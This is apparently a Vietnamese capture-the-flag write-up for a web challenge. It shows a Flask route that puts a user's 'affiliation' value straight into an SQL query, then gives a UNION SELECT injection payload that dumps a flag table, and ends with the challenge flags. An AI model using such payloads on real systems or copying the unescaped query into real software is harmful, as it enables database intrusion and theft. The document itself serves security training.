@@ -1,0 +1,43 @@
+Bài web asiaccs (mặc dù mình chưa học gì về web)
+
+Dạo vòng quanh mã nguồn thì thấy server không kiểm tra, lọc escape giá trị trường affiliation trước khi đưa vào truy vấn SQL.
+
+@app.route("/api/search_by_affiliation", methods=["POST"])
+def search_by_affiliation():
+    data = request.json
+    affiliation = data.get("affiliation", "")
+    # Affiliation được đưa trực tiếp vào truy vấn SQL mà không kiểm tra
+    query = f"SELECT title, author, affiliation FROM papers WHERE affiliation LIKE '%{affiliation}%'"
+    results = db.execute(query).fetchall()
+    # trả về kết quả cho client
+
+Nên nếu mình nhập một chuỗi đặc biệt thì có thể chèn thêm lệnh SQL vào truy vấn gốc.
+
+VD:
+
+Mình nhập:
+' UNION SELECT flag, NULL, NULL FROM flag --
+
+Thì truy vấn trở thành:
+
+SELECT title, author, affiliation FROM papers WHERE affiliation LIKE '%' UNION SELECT flag, NULL, NULL FROM flag --
+
+Từ đó ta có thể tạo được payload exploit.py để request lên server qua /api/search_by_affiliation
+
+Kết quả trả về tại POST_res.txt
+
+Well, mặc dù không biết tí tẹo gì về SQL nhưng bê nguyên cái bảng đó về thì cũng mừng lắm rồi
+
+Giờ chỉ cần CTRL + F nhập HCMUS và lục soát toàn bộ thôi
+
+Flag là HCMUS-CTF{fake-flag-asiaccs} ....
+
+
+Đùa thôi
+Boom
+HCMUS-CTF{vibe-coding_more-jobs-for-pentesters!!}
+
+
+
+
+
